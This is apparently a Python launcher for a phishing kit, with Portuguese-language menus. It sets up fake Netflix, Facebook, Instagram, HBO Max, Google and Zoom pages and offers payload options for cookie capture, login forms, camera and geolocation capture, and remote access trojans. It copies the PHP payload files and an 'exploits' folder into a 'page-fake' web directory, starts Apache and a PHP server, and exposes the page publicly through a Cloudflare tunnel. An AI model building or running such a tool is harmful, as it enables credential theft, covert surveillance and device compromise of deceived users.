import os
import subprocess
import shutil
from time import sleep

# Cores para o terminal
RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
NC = '\033[0m' # No Color

# Variáveis
type_models = "API/img"
type_egs = "API/models"
apache = "/var/www/html/page-fake/"
php_cmd = '/mnt/c/Windows/System32/cmd.exe /c start wt new-tab -- wsl bash -c "php -S localhost:8080; exec bash"'
cloudflare_cmd = '/mnt/c/Windows/System32/cmd.exe /c start wt new-tab -- wsl bash -c "cloudflare tunnel --url localhost:8080; exec bash"'

# Configuração inicial
os.system("clear")
print("[**Criando nova pasta para o modelo**]")
os.makedirs(apache, exist_ok=True)
print("[**Modelo criado com sucesso**]\n")

def show_model_menu():
    os.system("clear")
    print(f"""{YELLOW}+______________________________________________________________________+{NC}
|                                                                      |
|            {GREEN}[**Escolha qual tipo de EG.S você deseja**]{NC}               {YELLOW}|{NC}
+______________________________________________________________________+
|                                                                      |     
|   1 --------------------------------->> {GREEN}Standart{NC}                     {YELLOW}|{NC}         
+_____________________________________________________________________+
|                                                                      |                     
|   2 ------------------>> {GREEN}Captura de cookies Beta{NC}                     {YELLOW}|{NC}
+_____________________________________________________________________+
|                                                                      |
|   3 ------------------------------->> {GREEN}Formulario{NC}                     {YELLOW}|{NC}
+_____________________________________________________________________+
|                                                                      |
|   4 ---------------------->> {GREEN}Formulario + Camera{NC}                     {YELLOW}|{NC}
+_____________________________________________________________________+
|                                                                      |
|   5 ------------------->> {GREEN}Formulario + Geolocate{NC}                     {YELLOW}|{NC}
+_____________________________________________________________________+
|                                                                      |
|   6 --------->> {GREEN}Formulario + Geolocate  + Camera{NC}                     {YELLOW}|{NC}
+_____________________________________________________________________+
|                                                                      |
|   7  ->> {GREEN}Formulario + Geolocate  + Camera + Rats{NC}                     {YELLOW}|{NC}
+_____________________________________________________________________+
|                                                                      |
|   8 ------------------------------------>> {GREEN}Login{NC}                     {YELLOW}|{NC}
+_____________________________________________________________________+
|                                                                      |
|   9 -------->> {GREEN}Login +  Geolocate{NC}                                    {YELLOW}|{NC}
+______________________________________________________________________+
|                                                                      |
|   10 -------->> {GREEN}Camera{NC}                                               {YELLOW}|{NC} 
+______________________________________________________________________+
|                                                                      |
|   11 -------->> {GREEN}Login + Camera + Location{NC}                            {YELLOW}|{NC} 
+______________________________________________________________________+
|                                                                      |
|   12 -------->> {GREEN}Login + Location + Rats{NC}                              {YELLOW}|{NC} 
+______________________________________________________________________+
|                                                                      |
|   13 -------->> {GREEN}Login + Location{NC}                                     {YELLOW}|{NC} 
+______________________________________________________________________+
|                                                                      |
|   0 -------->> {RED}Sair{NC}                                                  {YELLOW}|{NC} 
+______________________________________________________________________+\n""")

def show_main_menu():
    os.system("clear")
    print(f"""{YELLOW}+______________________________________________________________________+{NC}
|                                                                      |
|                 {GREEN}[**Escolha o tipo de modelo**]{NC}                       {YELLOW}|{NC}
+______________________________________________________________________+
|                                                                      |     
|   1 --------------------------------->> {GREEN}Netflix{NC}                      {YELLOW}|{NC}         
+______________________________________________________________________+
|                                                                      |                     
|   2 ------------------>> {GREEN}Facebook{NC}                                    {YELLOW}|{NC}
+______________________________________________________________________+
|                                                                      |
|   3 ------------------------------->> {GREEN}Intagram{NC}                       {YELLOW}|{NC}
+______________________________________________________________________+
|                                                                      |
|   4 ---------------------->> {GREEN}HboMax{NC}                                  {YELLOW}|{NC}
+______________________________________________________________________+
|                                                                      |
|   5 ------------------->> {GREEN}Google{NC}                                     {YELLOW}|{NC}
+______________________________________________________________________+
|                                                                      |
|   6 ------------------->> {GREEN}Zoom{NC}                                     {YELLOW}|{NC}
+______________________________________________________________________+
|                                                                      |
|   0 -------->> {RED}Voltar{NC}                                                {YELLOW}|{NC} 
+______________________________________________________________________+\n""")

def process_main_choice(choice):
    try:
        src_files = {
            1: ("1.jpg", "1.jpg"),
            2: ("2.jpg", "1.jpg"),
            3: ("3.jpg", "1.jpg"),
            4: ("4.jpg", "1.jpg"),
            5: ("5.jpg", "1.jpg"),
            6: ("6.jpg", "1.jpg")
        }
        
        if choice == 0:
            print(f"{RED}Voltando ao menu principal...{NC}")
            return
        elif choice in src_files:
            src, dest = src_files[choice]
            shutil.copy(f"{type_models}/{src}", f"{apache}/{dest}")
            print(f"{GREEN}Modelo copiado com sucesso!{NC}")
        else:
            print(f"{RED}Opção inválida!{NC}")
            
    except Exception as e:
        print(f"{RED}Erro: {str(e)}{NC}")

def process_model_choice(choice):
    try:
        if choice == 1:
            print(f"{GREEN}Standart selecionado{NC}")
            shutil.copy(f"{type_egs}/index.php", apache)
            shutil.copytree(f"{type_egs}/exploits", f"{apache}/exploits")
            subprocess.run(["sudo", "systemctl", "start", "apache2"])
            subprocess.run(["sudo", "systemctl", "enable", "apache2.service"])
            subprocess.Popen(php_cmd, shell=True)
            subprocess.Popen(cloudflare_cmd, shell=True)

        elif 2 <= choice <= 13:
            php_file = f"{choice}.php"
            shutil.copy(f"{type_egs}/{php_file}", apache)
            subprocess.run(["sudo", "systemctl", "start", "apache2"])
            subprocess.run(["sudo", "systemctl", "enable", "apache2.service"])
            subprocess.Popen(php_cmd, shell=True)
            subprocess.Popen(cloudflare_cmd, shell=True)

        elif choice == 0:
            print(f"{RED}Saindo...{NC}")
            exit()
            
        print(f"{GREEN}Operação concluída com sucesso!{NC}")
        
    except Exception as e:
        print(f"{RED}Erro: {str(e)}{NC}")

while True:
    show_main_menu()
    try:
        choice = int(input("Escolha um modelo --->>> "))
        process_main_choice(choice)
        input("Pressione Enter para continuar...")
        
        show_model_menu()
        egs_choice = int(input("Escolha uma opção de EG.S --->>> "))
        process_model_choice(egs_choice)
        
    except ValueError:
        print(f"{RED}Entrada inválida! Digite um número.{NC}")
        sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}Operação cancelada pelo usuário!{NC}")
        exit()